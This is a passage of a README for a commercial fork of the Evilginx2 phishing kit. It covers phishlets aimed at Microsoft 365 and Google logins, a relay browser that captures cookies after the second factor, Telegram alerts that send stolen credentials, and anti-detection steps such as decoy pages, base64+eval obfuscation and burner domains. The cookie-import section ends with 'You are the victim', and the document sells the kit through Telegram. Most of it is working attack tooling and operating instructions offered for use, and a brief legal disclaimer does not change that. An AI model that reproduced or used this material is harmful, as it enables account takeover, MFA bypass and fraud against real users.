| `POST` | `/api/relay/kill/<sid>` | operator | terminate a session |

---

# 🛡️ Guard Rules

`allowdeny.txt`, three fields per line, `#` comments, blank lines ignored:

```
allow host accounts.google.com
allow host *.gstatic.com
deny  host *.local
deny  cidr 192.0.2.0/24
allow cc   NG
```

- **allow beats deny**, always, for the same target
- patterns: exact, `*.suffix`, or `.suffix` (apex and subdomains)
- the built-in deny list is applied first: `0.0.0.0/8`, `10.0.0.0/8`, `100.64.0.0/10`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, `192.0.0.0/24`, `192.168.0.0/16`, `198.18.0.0/15`, `224.0.0.0/4`, `240.0.0.0/4`, `::1/128`, `fc00::/7`, `fe80::/10`, `ff00::/8`
- a malformed line aborts startup with `file:line`, so a typo cannot silently weaken the guard

`country.csv` is `cidr,CC`, longest prefix wins:

```
102.89.0.0/16,NG
8.8.8.0/24,US
```

If any `cc` rule exists, an IP that matches no table entry is denied. Ship the table or drop the rules.

---

# 🛠️ Phishlet Tooling

Three scripts at the repo root. Use them in this order.

### 1. `patch_phishlet.py` — fix a phishlet

```bash
python3 patch_phishlet.py
python3 patch_phishlet.py phishlets/foo.yaml
```

Replaces only the top-level `js_inject` block and inserts `rewrite_urls` before `auth_tokens`. Filter lines untouched. Writes a timestamped `.bak` first.

### 2. Consumer tokens → optional

Run the flip block from [DOCKERDEPLOYMENT.md](DOCKERDEPLOYMENT.md) stage **28d**. It converts 27 `.live.com` names from `:always` to `:opt` so `cookies_complete` is reachable on a work account.

### 3. `validate_phishlet.py` — the gate

```bash
python3 validate_phishlet.py
```

```
always tokens : 12 (expect 12)
opt tokens    : 31 (expect >= 30)

RESULT: PASSED
```

Fails on: stray `1p(`, missing `function lp()`, missing `split('#')`, missing injection bootstrap, wrong `location`, missing `rewrite_urls`, missing `auth_urls`, missing required `ESTSAUTH*`, wrong token counts, short filter list, any YAML parse error.

### 4. `validate_gsuite.py` — the relay phishlet gate

```bash
python3 validate_gsuite.py
```

```
bindings : 12, all known

RESULT: PASSED
```

Proves the gsuite relay script only calls bindings that exist, that braces and parentheses balance, that no apostrophe has opened a fake string in the counter, and that `gs` does not collide with `rl`. Run it before every enable.

### 5. `make_cookie_import.py` — convert an export

```bash
python3 make_cookie_import.py
```

Writes `cookies-import.json` and `cookies-netscape.txt`, prints every cookie and a PRESENT/absent line per essential.

> **Pass condition:** `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `ESTSAUTHLIGHT` all PRESENT. `MSPAuth`, `RPSSecAuth`, `WLSSC`, `ANON` absent is correct on a work account.

---

# 📊 Web Interfaces & API

### Admin panel — `http://YOUR_IP:8082`

Sessions (search/filter/export/bulk delete/mark reviewed/**download cookies**), stats, phishlets, lures, **proxies**, **relay status**, Telegram, users, audit log. `admin` · `operator` · `viewer`.

### Session API

| Method | Endpoint | Auth | Purpose |
|:--|:--|:--|:--|
| `GET` | `/api/sessions/cookies?id=N` | session | Cookie-Editor JSON jar |
| `GET` | `/api/sessions/cookies.txt?id=N` | session | Netscape `cookies.txt` |
| `GET` | `/api/proxies` | operator | list proxies |
| `POST` | `/api/proxies` | operator | create/update |
| `DELETE` | `/api/proxies?name=X` | operator | delete |
| `POST` | `/api/proxies/test` | operator | dial through, return egress IP |
| `POST` | `/api/proxies/assign` | operator | bind to global / phishlet / lure |

> All auth-gated. A bare `curl` returns `{"error":"unauthorized"}` — log in and reuse the jar.

### Dashboard — `http://YOUR_IP:5000`

Sortable, searchable sessions, CSV/JSON export, dark mode, auto-refresh. HTTP basic auth.

---

# 🔧 Telegram Setup

1. **@BotFather** → `/newbot` → copy the token.
2. Send the bot a message, then open `https://api.telegram.org/bot<TOKEN>/getUpdates` and copy the `chat.id`.
3. Configure via `.env`, the panel, or the console:

```
config teletoken 8863425004:AAF7mZ0poUo6dal8-...
config chatid 7545456339
config telegram test
```

You will receive arrival pings, credential alerts with the jar attached, and validation results.

---

# 🍪 Cookie Import — the part everyone gets wrong

1. `python3 make_cookie_import.py` — confirm all three essentials read PRESENT.
2. Prove the jar outside a browser:

```bash
curl -s -b cookies-netscape.txt -o /dev/null -w "http %{http_code}\n" \
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
```

`200`, or the jar is stale.

> For a relay jar, prove it with `-L` and a real user agent, or a bare `curl` answers `301`/`302` on a perfectly good jar:
> ```bash
> UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36'
> curl -sSL -A "$UA" -b "data/relay/$SID/cookies.txt" -o /dev/null -w "mail %{http_code}\n" https://mail.google.com/
> ```

3. Install **Cookie-Editor**.
4. Open a **fresh private window** at the **real** host the victim used.
5. Cookie-Editor → **Import** → paste the **entire** `cookies-import.json`.
6. Reload. You are the victim.

### The bracket trap

The jar is a JSON **array**. It starts with `[`. Selecting from the first `{` gives *"not in a valid format"* — which looks exactly like a broken capture.

Two safe ways to copy it:

**A. Off the box** — from Windows `cmd` (not the SSH session):

```
cd %USERPROFILE%\Downloads
scp root@YOUR_IP:~/evilginx2/cookies-import.json .
```

Open in Notepad, `Ctrl+A`, `Ctrl+C`.

**B. One line**, then **triple-click** it (triple-click takes the whole wrapped line, brackets included) — do not drag:

```bash
cat cookies-import.json | tr -d '\n'
```

### Read the verdict before you blame the capture

```bash
grep -o '"cookies_complete": *[a-z]*' data/exports/latest_office365.all.json
grep -o '"missing_auth_tokens": *\[[^]]*\]' data/exports/latest_office365.all.json
```

- `true` → the jar is whole; the host or the clock is the problem.
- `false` → `missing_auth_tokens` names the exact cookie that never arrived. Usually the victim skipped "Stay signed in".

Never hand-edit a `.cookies.json`. Re-import the whole array.

### Relay captures

Relay sessions land in `data/relay/<sid>/`. `cookies.json` is already in import format — skip the converter. Pick the directory by modification time, not by position in the session list, because the list is unordered:

```bash
ls -1t data/relay/ | head -1
jq -r '.[].name' "data/relay/$(ls -1t data/relay/ | head -1)/cookies.json" | grep -cE '^(SID|HSID|SSID|SAPISID|APISID|__Secure-1PSID|__Secure-3PSID)$'
#   → 7
```

`__Secure-3PSID` is only minted **after a second factor**. Seven means the flow finished. Under seven means it did not.

---

# 🧬 DOM Injection Guide

```yaml
js_inject_default_location: 'body_bottom'

js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/common/oauth2/v2.0/authorize']
    trigger_params: ['client_id']
    location: 'head'
    script: |
      window.__injected = true;
```

| Field | Meaning |
|:--|:--|
| `trigger_domains` | hosts this fires on |
| `trigger_paths` | regexes, unanchored — no trailing `*` needed |
| `trigger_params` | lure params that must all be present |
| `location` | `head` · `body_top` · `body_bottom` |
| `script` | the JavaScript; `{param}` is substituted |

Served from `/s/<sid>/<js_id>.js`, base64-obfuscated, CSP nonces inherited. Injection is a real HTML5 parse.

> ⚠️ An injected script with a `SyntaxError` fails **silently**. Check the console, run the validator.

---

# 🌐 rewrite_urls Guide

```yaml
rewrite_urls:
  - trigger:
      domains: ['login.microsoftonline.com']
      paths: ['/common/oauth2/v2.0/authorize']
    rewrite:
      path: '/signin'
      query:
        - key: 'boop'
          value: '{id}'
      exclude_keys: ['client_id']
```

Empty `domains` or `paths` means "any". `{id}` is a fresh random token. The rewritten URL is TTL-cached so the follow-up translates back.

> ⚠️ **Microsoft caveat.** The page appends `&sso_reload=true`, the exact-match cache misses, and evilginx returns its own 404. The filters already cover the long path, so the template ships `REWRITE_URLS=false`. Test it **after** your first successful capture, and revert with `sed -i 's/^REWRITE_URLS=.*/REWRITE_URLS=false/' .env && docker compose up -d` if it 404s.

---

# 🛰️ Proxies Guide

**`proxy` is not a host command.** It exists only inside the console.

```bash
docker compose attach evilginx2
```

```
proxy create uk-1 socks5 1.2.3.4 1080
proxy test uk-1
proxy use uk-1
proxy assign phishlet office365 uk-1
proxy assign lure 3 uk-1
proxy list
proxy off
proxy delete uk-1
```

Resolution order: **lure → phishlet → global → direct.** Disabled proxies fall through.

> ⚠️ `context deadline exceeded` from `proxy test` is a dead proxy, not evilginx. Check it from the host: `curl -s --socks5 1.2.3.4:1080 https://api.ipify.org`

> **Relay note:** `RELAY_UPSTREAM_PROXY` is the relay's equivalent. Chrome goes guard → upstream → origin, so the guard still applies. Prefer SOCKS5: it preserves the client TLS signature (JA4), an HTTP proxy re-signs it.

---

# 🔁 Operations Runbook

```bash
cd ~/evilginx2
docker compose attach evilginx2        # console, Ctrl-p Ctrl-q to detach
docker logs -f evilginx2               # follow
docker logs -f chrome                  # browser side
docker compose up -d                   # apply .env
curl -s http://127.0.0.1:18556/health | jq .
ls -la data/relay/ ; ls -la data/exports/
```

Kill every stuck session:

```bash
curl -s http://127.0.0.1:18556/sessions | jq -r '.[] | select(.status=="running") | .id' \
  | while read id; do curl -s http://127.0.0.1:18556/kill/$id; echo; done
```

Age out old captures nightly:

```bash
(crontab -l 2>/dev/null; echo "0 4 * * * find /root/evilginx2/data/relay -type f -mtime +30 -delete") | crontab -
```

Update safely:

```bash
cp .env .env.backup && git checkout -- . && git pull && docker compose build && docker compose up -d
```

---

# 🛡️ Bot Protection & OPSEC

| Layer | Trigger | Action |
|:--|:--|:--|
| Bot filter | 40+ crawler/automation UAs | decoy page or block |
| IP blacklist | `all` / `unauth` | decoy or 403 |
| GeoIP country block | ISO codes | block |
| VPN/proxy/datacenter | `-block-vpn` | block |
| Turnstile | `-turnstile` | CAPTCHA |
| Relay egress guard | always on relay | deny private + metadata |
| Header stripping | always | both directions |
| URL rewriting | always | cleans address bar + DOM |
| CSS randomisation | every load | unique pixel fingerprint |
| Dynamic spoofing | blocked visitors | real-looking decoy |
| JS obfuscation | injected scripts | base64 + eval |

**Tips:** burner domain, WHOIS privacy, DNS-only records, wildcard cert so only the root appears on crt.sh, keep `blacklist unauth` on, keep `SESSION_RETENTION_DAYS` set, never restart the container mid-login, and keep the guard rules file in version control so a rebuild cannot silently widen egress.

---

# 📋 Commands Reference

### Config

```
config domain example.com
config ipv4 external 1.2.3.4
config autocert on
config unauth_url https://...
config strip_headers on
config telegram test
```

### Telegram

```
config teletoken <token>
config chatid <id>
```

### Phishlets

```
phishlets hostname office365 dom.com
phishlets enable office365
phishlets disable office365
phishlets hide office365
phishlets unhide office365
phishlets get-hosts office365
phishlets create <template> <child> key=value
phishlets delete <child>
```

### Lures

```
lures create office365
lures get-url 0
lures edit 0 proxy uk-1
lures edit 0 redirect_url https://real-site.com
lures pause 0 1h
lures unpause 0
lures delete 0
lures delete all
```

### Proxies

```
proxy
proxy list
proxy create <name> <http|https|socks5|socks5h> <address> <port>
proxy delete <name>
proxy use <name>
proxy off
proxy test <name>
proxy assign <global|phishlet|lure> <target> <name>
proxy enable | disable | type | address | port | username | password
```

### Sessions

```
sessions
sessions <id>
sessions delete <id>
sessions delete 1-7,10-12
sessions delete all
```

### Blacklist

```
blacklist all | unauth | noadd | off
blacklist log on | off
```

### Console control

`Ctrl-p` then `Ctrl-q` detaches. Never `Ctrl-c`, never `exit`.

---

# 🧯 Troubleshooting

### Relay

| Symptom | Cause | Fix |
|:--|:--|:--|
| Page stuck on "Connecting…" | start call failed | `docker logs evilginx2 \| grep relay` |
| `chrome unreachable` | container still booting, or down | poll 9222 until it answers, then reopen; `docker logs chrome` |
| `websocket bad handshake: 404` | DevTools dialled on the bare control URL | `resolveChromeURL` missing — the guide's stage 0 count must be `3` |
| `websocket bad handshake: 403` | DevTools origin rejected | `--remote-allow-origins` missing — stage 0 count must be `1` |
| 502 on `/__relay/start` | script missing or bad | `ls scripts/`; check `script:` name |
| 404 on the relay host | hostname set to `rl.domain` instead of the apex | `phishlets hostname relay-gmail DOMAIN` |
| `fail: no email field` about 40 s in | orphan tab satisfied a stale selector | recreate chrome, wait for 9222, retry |
| Frames freeze, clicks still land | `shm_size` too small | raise to `2gb`, `up -d` |
| `time limit reached` | `timeout` too low | raise `timeout` or `RELAY_MAX_SECONDS` |
| No `cookies.json` written | flow failed | read `.error` from `/sessions` |
| Metadata call returns 200 | guard down, traffic went direct | `ss -lntp \| grep 18555`; `docker logs evilginx2 \| grep relay` |
| Every site 403 | country rule with no table | add `country.csv` or drop the `cc` rules |
| `guard listen: address already in use` | second instance | `ss -lntp \| grep 18555` |
| Guard denies a normal site | missing allow | add `allow host …` and reload |
| Sessions die after 5 min idle | reaper, viewer closed | raise `RELAY_IDLE_SECONDS` |
| VNC blank | Xvfb died | `docker logs chrome` |

### Typing and input

| Symptom | Cause | Fix |
|:--|:--|:--|
| Only the first character types | no refocus before each key | `grep -c 'refocus' relay/input.go` must be ≥ 6 |
| Backspace / Enter / arrows dead | key events sent without `Code` or virtual key codes | `grep -c 'WindowsVirtualKeyCode' relay/input.go` must be `1` |
| Backspace navigates the viewer tab back | `preventDefault` missing | `grep -c 'kdown' relay/viewer.html` must be `1` |
| Nothing types at all | viewer not sending `text` | `grep -c "t: 'text'" relay/viewer.html` must be `1` |

### Proxy

| Symptom | Cause | Fix |
|:--|:--|:--|
| `validate_phishlet.py` → `SyntaxError: cd ~/evilginx2` | shell wrapper in the file | strip before shebang, after `sys.exit(main())` |
| `sub_filters list looks short` | threshold too high | `sed -i 's/len(sf) > 100/len(sf) >= 80/'` |
| `1p(` present | patch didn't take | restore `.orig`, rerun the patcher |
| Email box never autofills | no `#email` in the lure, or `DOM_INJECTION=0` | append `#user@example.com` |
| `/signin` 404 | `sso_reload` breaks the cache | `REWRITE_URLS=false` + `up -d` |
| `Command 'proxy' not found` | typed in the shell | attach first |
| `hostname … collision` on boot | stale `o365.yaml` / `1.yaml` | `git rm -f phishlets/1.yaml phishlets/o365.yaml` |
| `AUTO_EXPORT_PATH=[]` in container | empty value | set it inside the volume, `up -d` |
| Exports vanish after rebuild | path off-volume | same |
| `! [rejected] master -> master` | diverged | `git fetch origin master && git reset --soft origin/master && git add -A && git commit && git push` |
| `Author identity unknown` | no git identity | `git config --global user.name/user.email` |
| Imported cookies don't log in | incomplete jar | check `cookies_complete`, redo, click "Stay signed in" |
| Cookie-Editor "invalid format" | missing `[` `]` | `tr -d '\n'` + triple-click, or scp |
| Logs out after a minute | session cookies only | redo, "Stay signed in" → Yes |
| `__Host-` rejected | mismatched domain | import on the exact host |
| Cert issuance times out | ACME slow on many hosts | `test-certs`, retry the enable |
| Panel unreachable | bound to loopback | it binds `0.0.0.0`; check the firewall |
| Panel login rejected after edit | used `restart` | `docker compose up -d` |
| Bot filter blocks a real visitor | unusual UA | `BOT_FILTER=0` |

---

# ❓ FAQ

**Why is this cheaper than Pro if it does more?**
No cloud infrastructure to run, no per-seat model, and one maintainer instead of a company. You host it. The work that went into the relay engine and the guard is real, but it is not carrying a SaaS bill.

**Do I get the source?**
Yes. BSD 3-Clause. Diff it, patch it, keep it after the licence term.

**Will you help me deploy?**
Yes, on Telegram, while you get your first capture. The 36-stage guide exists so the help is short.

**Does it work on a 2 GB VPS?**
One relay session at a time, yes. Two at once is tight. Three is swap. Resize to 4 GB before real traffic.

**Can I run both proxy and relay?**
Yes, side by side, on separate `phish_sub` values. The shipped pair owns `rl` and `gs`; `office365` owns `login`.

**What breaks when Google or Microsoft ship a UI change?**
A relay script's selector. You edit one line in `scripts/relay-gsuite.js`, run `validate_gsuite.py`, and you are back. No re-cloning a kit, no waiting for someone else.

**Is the guard really necessary?**
Yes. Without it a relayed browser can reach your loopback services and your cloud metadata endpoint. It is the difference between "a browser on my box" and "a browser on my box that cannot leave".

**What is the honest weakness?**
Two things: no built-in replay workspace (you import the jar, which takes seconds), and UA-signature bot filtering rather than TLS fingerprinting. Everything else is parity or ahead.

**What is the licence term and what happens after?**
Ask on Telegram — it is a one-time arrangement, not a subscription, and there is no kill switch in the binary because there is no binary.

---

# 👏 Credits

| Contribution | Author |
|:--|:--|
| Original Evilginx2 core | **Kuba Gretzky ([@kgretzky](https://github.com/kgretzky))** |
| Telegram integration, panels, GeoIP, credential validation, CSS randomisation, extension detection, header stripping, URL rewriting, dynamic spoofing, bot filtering, visitor alerts, retention, backups | **Official Monsterz** — [t.me/officialmonsterz](https://t.me/officialmonsterz) · [github.com/officialmonsterz](https://github.com/officialmonsterz) · shapads@tutamail.com |
| Relay browser engine, egress guard, DOM injection engine, `rewrite_urls`, multi-scope tunnelling proxies, cookie capture/export rebuild, completeness verification, thread-safety hardening | this fork |
| Phishlet patcher, validator, gsuite validator, cookie converter, 36-stage deployment guide, fixed `office365` phishlet | this fork |

- Telegram: [t.me/officialmonsterz](https://t.me/officialmonsterz)
- GitHub: [github.com/officialmonsterz](https://github.com/officialmonsterz)
- Email: shapads@tutamail.com

If this saved you a week, go and thank the people who built the parts this stands on.

---

# ⚠️ Legal Notice

Dual-use tool intended for authorised penetration testing, security research, red-team engagements under signed RoE, and accredited education. Not for unauthorised access, identity theft, credential harvesting or fraud. You accept full legal responsibility for your use.

---

<p align="center">
  <b>If this repo saved you time, star it — it's the only signal that keeps it maintained.</b>
</p>

<p align="center">
  <b>Ready to use it? <a href="https://t.me/officialmonsterz">Message on Telegram</a> · <a href="mailto:shapads@tutamail.com">Email</a></b>
</p>

<p align="center">
  <sub>Built by red teamers, for red teamers. Based on the pioneering work of <a href="https://t.me/officialmonsterz">Official Monsterz</a> and <a href="https://github.com/kgretzky">Kuba Gretzky</a>. Licensed under BSD 3-Clause.</sub>
</p>

---

**What changed in the README, and why**

| # | Change | Why |
|:--|:--|:--|
| 1 | `docker compose attach evilginx` → `evilginx2` | the service is named `evilginx2`; the old name fails |
| 2 | Go badge `1.25+` → `1.26+` | the Dockerfile and toolchain are 1.26 |
| 3 | Badge and body `26 stages` → `36 stages` | there are 36 |
| 4 | Step 6 points at stage 10 for the `.env` block | the env table is a reference, not copy-pasteable |
| 5 | `chmod` adds `validate_gsuite.py` | 8k runs it and it must be executable |
| 6 | Token flip cited as stage 22 → **28d** | 22 is Track A enable |
| 7 | Pricing & Contact section, plus a cost row in every comparison and in the overall table | the README had no price and no path to the owner |
| 8 | Explicit note to prove the guard **before** `blacklist unauth` | otherwise the reader's own curl gets banned and looks like a dead service |
| 9 | `validate_gsuite.py` documented as its own gate | it is the relay phishlet's equivalent of the office365 validator and was undocumented |
| 10 | Relay jar proof shows `-L` with a real user agent | a bare curl answers 301/302 on a good jar |
| 11 | Relay capture lookup uses `ls -1t`, not `[0]` | the session list is unordered |
| 12 | FAQ added | price, source, support, RAM, weaknesses, licence term — the six things a buyer asks before messaging |
